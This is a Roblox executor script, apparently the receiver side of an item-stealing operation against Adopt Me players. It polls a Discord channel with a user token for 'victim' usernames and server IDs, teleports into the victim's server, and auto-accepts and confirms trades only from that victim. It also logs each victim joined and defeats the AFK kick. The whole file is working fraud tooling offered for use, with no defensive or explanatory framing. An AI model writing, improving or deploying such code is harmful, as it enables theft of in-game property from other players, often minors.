if not game:IsLoaded() then
	game.Loaded:Wait()
end

if token == "" or channelId == "" then
	game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

-- Anti AFK
local vu = game:GetService("VirtualUser")
game.Players.LocalPlayer.Idled:Connect(function()
	vu:CaptureController()
	vu:ClickButton2(Vector2.new())
end)

-- Services
local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")

-- Teleport logic state
local isTeleporting = false
local failedAttempts = 0
local MAX_ATTEMPTS = 3
local lastJoinTime = 0
local joinCooldown = 10

-- File setup
if not isfile("useradm.txt") then writefile("useradm.txt", "victim username") end
if not isfile("joined_ids_adm.txt") then writefile("joined_ids_adm.txt", "[]") end

local victimUser = readfile("useradm.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))
local didVictimLeave = false
local timer = 0

-- Wait for load UI
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
while loadingScreen.Enabled do wait(1) end
wait(10)

-- Required Modules
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local tradeFrame = playerGui.TradeApp.Frame

-- Trade request handler
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
	if sender.Name == victimUser then
		TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
	else
		TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
	end
end)

-- Join chat
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')

-- Save joined IDs
local function saveJoinedId(messageId)
	table.insert(joinedIds, messageId)
	writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds))
end

local foodAdded = false

local function IsTrading()
    return tradeFrame.Visible
end

local function acceptTrade()
    while task.wait(0.1) do
        if IsTrading() then
            if not foodAdded then
                local foodKeys = {}
                for uid, data in pairs(inventory.food) do
                    table.insert(foodKeys, uid)
                end
                if #foodKeys > 0 then
                    local randomIndex = math.random(1, #foodKeys)
                    local randomFoodUid = foodKeys[randomIndex]
                    AddItemRemote:FireServer(randomFoodUid)
                    foodAdded = true
                end
            end
            AcceptNegotiationRemote:FireServer()
        end
    end
end

local function confirmTrade()
    while task.wait(0.1) do
        if IsTrading() and foodAdded then
            ConfirmTradeRemote:FireServer()
        end
    end
end

local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

local function tradeTimer()
    while task.wait(1) do
        if IsTrading() then
            timer = 0
        else
            timer = timer + 1
            foodAdded = false
        end
    end
end

waitForPlayerLeave()
task.spawn(acceptTrade)
task.spawn(confirmTrade)
task.spawn(tradeTimer)

local function safeTeleport(placeId, jobId)
	if isTeleporting then
		print("Already teleporting, skipping.")
		return
	end

	if tick() - lastJoinTime < joinCooldown then
		print("Join cooldown active, skipping.")
		return
	end

	lastJoinTime = tick()
	isTeleporting = true

	local success, err = pcall(function()
		TeleportService:TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
	end)

	if not success then
		warn("Teleport failed:", err)
		isTeleporting = false
		failedAttempts += 1

		if failedAttempts < MAX_ATTEMPTS then
			task.delay(5, function()
				safeTeleport(placeId, jobId)
			end)
		else
			warn("Max teleport attempts reached, giving up.")
		end
	else
		print("Teleport initiated.")
		failedAttempts = 0
	end
end

-- Handle teleport failures
TeleportService.TeleportInitFailed:Connect(function(player, result, message)
	warn("TeleportInitFailed:", result, message)
	isTeleporting = false
end)

-- Fetch Discord messages and join
local function autoJoin()
	local response = request({
		Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=10",
		Method = "GET",
		Headers = {
			['Authorization'] = token,
			['User-Agent'] = 'Mozilla/5.0',
			["Content-Type"] = "application/json"
		}
	})

	if response.StatusCode == 200 then
		local messages = HttpServ:JSONDecode(response.Body)

		for _, message in ipairs(messages) do
			local placeId, jobId = message.content:match("TeleportToPlaceInstance%((%d+),%s*['\"]([%w%-]+)['\"]%)")
			local victimUsername

			if message.embeds and message.embeds[1] and message.embeds[1].fields and message.embeds[1].fields[1] then
				victimUsername = message.embeds[1].fields[1].value
			end

			if placeId and jobId and victimUsername then
				if not table.find(joinedIds, tostring(message.id)) then
					print("New victim found:", victimUsername)
					saveJoinedId(tostring(message.id))
					writefile("useradm.txt", victimUsername)
					safeTeleport(placeId, jobId)
					return
				else
					print("Already joined this victim.")
				end
			else
				print("No valid teleport data in message.")
			end
		end
	else
		warn("Failed to fetch messages. Check token and channelId.")
	end
end

-- Loop join check
while task.wait(20) do
	autoJoin()
end
